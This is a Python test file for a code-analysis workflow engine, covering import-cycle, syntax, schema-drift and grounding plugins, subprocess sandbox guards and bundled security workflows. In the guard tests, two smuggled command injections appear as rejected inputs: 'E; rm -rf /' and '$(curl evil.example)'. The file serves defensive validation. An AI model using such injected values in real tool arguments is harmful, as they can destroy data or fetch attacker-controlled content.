"""Tests for the shipped plugins and end-to-end execution of bundled workflows."""
import asyncio
import unittest
from unittest.mock import AsyncMock, patch

from engine.agents.base_agent import AgentBase, AgentResult
from engine.workflow.artifacts import STATUS_SKIPPED, STATUS_SUCCEEDED
from engine.workflow import builtins as workflow_builtins
from engine.workflow.builtins import (
    BuildVerifier,
    DependencyGraphPlugin,
    EngineAgentPlugin,
    GroundingSanityVerifier,
    SchemaDriftPlugin,
    SyntaxVerifier,
    register_builtin_plugins,
)
from engine.workflow.plugins import AnalysisContext, registered_kinds, resolve_plugin
from engine.workflow.runner import run_workflow
from engine.workflow.spec import load_builtin_workflow

BUILTIN_WORKFLOWS = ("security-hardening", "architectural-drift", "pr-sanity-verification", "vibe-safety")


class ShippedWorkflowCoverageTest(unittest.TestCase):
    """A workflow we ship must be runnable with the plugins we ship.

    External tools (semgrep, ruff, eslint) are allowed to be absent — those
    steps report skipped. What is not allowed is a step whose kind has no
    implementation at all, which would fail every run.
    """

    def setUp(self):
        register_builtin_plugins()

    def test_every_shipped_workflow_step_has_an_implementation(self):
        implemented = registered_kinds()
        for name in BUILTIN_WORKFLOWS:
            spec = load_builtin_workflow(name)
            for step in spec.steps:
                if step.role == "synthesizer":
                    continue
                with self.subTest(workflow=name, step=step.step_id):
                    self.assertIn(step.uses, implemented)

    def test_every_shipped_workflow_step_resolves_to_a_plugin(self):
        for name in BUILTIN_WORKFLOWS:
            spec = load_builtin_workflow(name)
            for step in spec.steps:
                if step.role == "synthesizer":
                    continue
                with self.subTest(workflow=name, step=step.step_id):
                    self.assertIsNotNone(resolve_plugin(step))


class EngineAgentPluginFileIsolationTest(unittest.IsolatedAsyncioTestCase):
    """A pathological file must degrade honestly, not fail the whole step.

    The real-world trigger: `ast.parse` materialises legal `\\uXXXX` escape
    sequences inside analyzed source into lone surrogate constants, and any
    agent that hashes those values used to raise UnicodeEncodeError, which
    failed the entire `semantics` step and every dependent with it.
    """

    async def test_one_unanalyzable_file_does_not_fail_the_step(self):
        class ExplodingAgent(AgentBase):
            @property
            def name(self):
                return "ExplodingAgent"

            def analyze(self, snapshot, baseline):
                if "BOOM" in (snapshot.get("source") or ""):
                    raise UnicodeEncodeError(
                        "utf-8", "Const:str:...", 19, 20, "surrogates not allowed"
                    )
                return AgentResult(agent_name=self.name, score=0.0, details={}, evidence=[])

        class ExplodingManifest:
            display_name = "ExplodingAgent"

            def create(self):
                return ExplodingAgent()

        plugin = EngineAgentPlugin("engine.semantic", "semantic", {})
        with patch.object(workflow_builtins, "AGENT_REGISTRY", {"semantic": ExplodingManifest()}):
            report = await plugin.analyze(AnalysisContext(files={
                "bad.py": "x = 'BOOM'\n",
                "ok.py": "y = 1\n",
            }))

        by_file_and_rule = {(item.file, item.rule) for item in report.evidence}
        self.assertIn(("bad.py", "engine.semantic.analysis_error"), by_file_and_rule)
        self.assertNotIn(("ok.py", "engine.semantic.analysis_error"), by_file_and_rule)
        # The healthy file was still scored; the broken one is honestly
        # accounted for in the summary instead of aborting the plugin.
        self.assertIn("scored 1 file(s)", report.summary)
        self.assertIn("1 file(s) skipped on analysis errors", report.summary)


class DependencyGraphPluginTest(unittest.IsolatedAsyncioTestCase):
    async def test_detects_a_two_module_import_cycle(self):
        context = AnalysisContext(files={
            "pkg/alpha.py": "from pkg import beta\n",
            "pkg/beta.py": "from pkg import alpha\n",
            "pkg/__init__.py": "",
        })
        report = await DependencyGraphPlugin().analyze(context)

        self.assertEqual(len(report.evidence), 1)
        self.assertIn("Import cycle", report.evidence[0].excerpt)
        self.assertEqual(report.evidence[0].severity, "high")

    async def test_reports_nothing_for_an_acyclic_graph(self):
        context = AnalysisContext(files={
            "pkg/alpha.py": "from pkg import beta\n",
            "pkg/beta.py": "x = 1\n",
            "pkg/__init__.py": "",
        })
        report = await DependencyGraphPlugin().analyze(context)
        self.assertEqual(report.evidence, ())

    async def test_ignores_imports_of_modules_outside_the_review(self):
        # A cycle through an unreviewed module cannot be confirmed from this data.
        context = AnalysisContext(files={"pkg/alpha.py": "import os\nimport requests\n"})
        report = await DependencyGraphPlugin().analyze(context)
        self.assertEqual(report.evidence, ())

    async def test_survives_an_unparsable_file(self):
        context = AnalysisContext(files={"broken.py": "def (:\n"})
        report = await DependencyGraphPlugin().analyze(context)
        self.assertEqual(report.evidence, ())

    async def test_detects_a_typescript_import_cycle(self):
        context = AnalysisContext(files={
            "src/alpha.ts": 'import { beta } from "./beta";\nexport const alpha = beta;\n',
            "src/beta.ts": 'import { alpha } from "./alpha";\nexport const beta = alpha;\n',
        })
        report = await DependencyGraphPlugin().analyze(context)

        self.assertEqual(len(report.evidence), 1)
        self.assertEqual(report.evidence[0].rule, "graph.dependency.circular_import")


class SyntaxVerifierTest(unittest.IsolatedAsyncioTestCase):
    async def test_reports_syntax_errors_with_a_line_anchor(self):
        context = AnalysisContext(files={"good.py": "x = 1\n", "bad.py": "def (:\n"})
        report = await SyntaxVerifier().analyze(context)

        self.assertEqual(len(report.evidence), 1)
        self.assertEqual(report.evidence[0].file, "bad.py")
        self.assertIsNotNone(report.evidence[0].start_line)

    async def test_passes_a_clean_tree(self):
        report = await SyntaxVerifier().analyze(AnalysisContext(files={"good.py": "x = 1\n"}))
        self.assertEqual(report.evidence, ())


class SchemaDriftPluginTest(unittest.IsolatedAsyncioTestCase):
    async def test_reports_removed_schema_contract_shapes(self):
        report = await SchemaDriftPlugin().analyze(AnalysisContext(
            files={"contracts/user.schema.json": '{"id": 1}'},
            baselines={"contracts/user.schema.json": '{"id": 1, "role": "admin"}'},
        ))
        self.assertEqual(len(report.evidence), 1)
        self.assertEqual(report.evidence[0].rule, "graph.schema_drift.removed_contract")

    async def test_ignores_additive_schema_changes(self):
        report = await SchemaDriftPlugin().analyze(AnalysisContext(
            files={"contracts/user.schema.json": '{"id": 1, "role": "admin"}'},
            baselines={"contracts/user.schema.json": '{"id": 1}'},
        ))
        self.assertEqual(report.evidence, ())

    async def test_reports_json_schema_type_change_and_new_required_field(self):
        baseline = {
            "type": "object",
            "properties": {"id": {"type": "string"}},
        }
        current = {
            "type": "object",
            "required": ["id"],
            "properties": {"id": {"type": "number"}},
        }
        import json

        report = await SchemaDriftPlugin().analyze(AnalysisContext(
            files={"contracts/user.schema.json": json.dumps(current)},
            baselines={"contracts/user.schema.json": json.dumps(baseline)},
        ))

        self.assertEqual(len(report.evidence), 1)
        self.assertTrue(report.evidence[0].metadata["removedShapes"])
        self.assertTrue(report.evidence[0].metadata["newlyRequired"])

    async def test_reports_openapi_yaml_contract_drift(self):
        report = await SchemaDriftPlugin().analyze(AnalysisContext(
            files={"api/openapi.yml": "components:\n  schemas:\n    User:\n      type: object\n"},
            baselines={
                "api/openapi.yml": (
                    "components:\n  schemas:\n    User:\n      type: object\n"
                    "      properties:\n        id:\n          type: string\n"
                )
            },
        ))
        self.assertEqual(len(report.evidence), 1)


class GroundingSanityVerifierTest(unittest.IsolatedAsyncioTestCase):
    async def test_flags_evidence_outside_the_run_input(self):
        from engine.workflow.artifacts import EvidenceItem

        report = await GroundingSanityVerifier().analyze(AnalysisContext(
            files={"known.py": "value = 1\n"},
            upstream_evidence=(EvidenceItem(file="invented.py", excerpt="claim"),),
        ))
        self.assertEqual(len(report.evidence), 1)
        self.assertEqual(report.evidence[0].severity, "high")


class SubprocessPluginGuardTest(unittest.IsolatedAsyncioTestCase):
    async def test_refuses_to_run_without_an_explicit_workspace(self):
        # Otherwise the tool inherits the process CWD and scans whatever is there.
        from engine.workflow.builtins import RuffPlugin

        report = await RuffPlugin().analyze(AnalysisContext(
            files={"a.py": "x = 1\n"},
            options={"execution_profile": "trusted_sandbox"},
        ))
        self.assertIsNotNone(report.skipped_reason)
        self.assertIn("workspace_path", report.skipped_reason)
        self.assertIsNone(report.exit_code)

    async def test_build_refuses_to_run_without_a_trusted_workspace(self):
        report = await BuildVerifier().analyze(AnalysisContext(files={"package.json": "{}"}))
        self.assertIsNotNone(report.skipped_reason)
        self.assertEqual(report.command, ("npm", "run", "build", "--if-present"))

    async def test_static_readonly_never_starts_a_subprocess_even_with_a_workspace(self):
        with patch("engine.workflow.plugins.asyncio.create_subprocess_exec", new=AsyncMock()) as create:
            report = await BuildVerifier().analyze(AnalysisContext(
                files={"package.json": "{}"},
                workspace_path="C:/untrusted/checkout",
                options={"execution_profile": "static_readonly"},
            ))

        self.assertIsNotNone(report.skipped_reason)
        self.assertIn("trusted_sandbox", report.skipped_reason)
        create.assert_not_awaited()

    async def test_rejects_unsafe_tool_options(self):
        from engine.workflow.builtins import RuffPlugin, SemgrepPlugin

        with self.assertRaisesRegex(ValueError, "Unsafe ruff select"):
            RuffPlugin({"select": "E; rm -rf /"}).extra_args()
        with self.assertRaisesRegex(ValueError, "Unsafe semgrep config"):
            SemgrepPlugin({"config": "$(curl evil.example)"}).extra_args()


class BundledWorkflowExecutionTest(unittest.IsolatedAsyncioTestCase):
    """Runs a shipped workflow end to end against real source."""

    def setUp(self):
        register_builtin_plugins()

    async def test_architectural_drift_runs_to_completion(self):
        context = AnalysisContext(files={
            "pkg/__init__.py": "",
            "pkg/alpha.py": "from pkg import beta\n\n\ndef go():\n    return beta.value\n",
            "pkg/beta.py": "from pkg import alpha\n\nvalue = 1\n",
        })
        spec = load_builtin_workflow("architectural-drift")
        result = await run_workflow(spec, context, resolver=_resolver_skipping_synthesizer())

        self.assertEqual(result.status, STATUS_SUCCEEDED, result.error)
        cycles = [
            item for item in result.evidence
            if item.rule == "graph.dependency.circular_import"
        ]
        self.assertEqual(len(cycles), 1)

    async def test_security_hardening_tolerates_absent_external_tools(self):
        context = AnalysisContext(files={"app.py": "import os\npassword = 'hunter2'\n"})
        spec = load_builtin_workflow("security-hardening")
        result = await run_workflow(spec, context, resolver=_resolver_skipping_synthesizer())

        # semgrep/ruff may or may not be installed; either way the run completes.
        for step_id in ("owasp-top-ten", "python-lint"):
            artifact = result.artifact(step_id)
            self.assertIn(artifact.status, {STATUS_SUCCEEDED, STATUS_SKIPPED})
        self.assertEqual(result.artifact("secrets-and-injection").status, STATUS_SUCCEEDED)

    async def test_vibe_safety_static_readonly_runs_in_process_and_skips_external_tools(self):
        context = AnalysisContext(
            files={
                "src/run.ts": (
                    'import { exec } from "node:child_process";\n'
                    "exec(untrustedCommand);\n"
                ),
            },
            workspace_path="C:/must-not-be-executed",
            options={"execution_profile": "static_readonly"},
        )
        spec = load_builtin_workflow("vibe-safety")
        result = await run_workflow(spec, context, resolver=_resolver_skipping_synthesizer())

        self.assertEqual(result.artifact("secrets-and-injection").status, STATUS_SUCCEEDED)
        for step_id in (
            "semgrep-security",
            "python-security-lint",
            "javascript-lint",
            "build-gate",
            "test-gate",
        ):
            self.assertEqual(result.artifact(step_id).status, STATUS_SKIPPED)
        self.assertTrue(any(
            item.rule == "engine.security.child_process_exec"
            for item in result.evidence
        ))


def _resolver_skipping_synthesizer():
    """Synthesis belongs to the LLM layer, so stub it for engine-level tests."""
    from engine.workflow.plugins import BaseAnalyzerPlugin, PluginReport

    class StubSynthesizer(BaseAnalyzerPlugin):
        async def analyze(self, context):
            return PluginReport(summary="synthesis is performed by the LLM layer")

    def resolve(step):
        if step.role == "synthesizer":
            return StubSynthesizer()
        return resolve_plugin(step)

    return resolve


if __name__ == "__main__":
    unittest.main()
